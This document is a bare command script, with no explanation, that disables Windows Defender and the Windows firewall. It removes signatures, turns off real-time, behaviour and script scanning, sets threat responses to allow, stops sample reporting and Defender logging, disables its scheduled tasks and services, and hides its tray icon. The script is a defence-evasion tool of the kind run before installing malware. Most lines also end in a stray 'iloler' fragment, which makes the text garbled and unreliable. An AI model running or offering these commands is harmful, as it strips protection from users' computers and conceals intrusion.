"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $trueiloler

powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"iloler

powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"iloler

powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"iloler

powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"iloler

powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"iloler

powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"iloler
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"iloler

powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"iloler
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"iloler
powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"iloler

powershell.exe -command "Set-MpPreference -MAPSReporting 0"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"iloler
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"iloler
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"iloler

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"iloler

powershell.exe -command "Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"iloler
powershell.exe -command "REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f"iloler

powershell.exe -command "netsh advfirewall set allprofiles state off"iloler

reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /filoler
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /filoler
clsiloler
rem 0 - Disable Loggingiloler
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /filoler
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /filoler
clsiloler
rem Disable WD Tasksiloler
schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disableiloler
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disableiloler
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disableiloler
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disableiloler
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disableiloler
clsiloler
rem Disable WD systray iconiloler
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /filoler
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /filoler
clsiloler
rem Remove WD context menuiloler
reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /filoler
reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /filoler
reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /filoler
clsiloler
rem Disable WD servicesiloler
reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /filoler
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /filoler
reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /filoler
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /filoler
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /filoler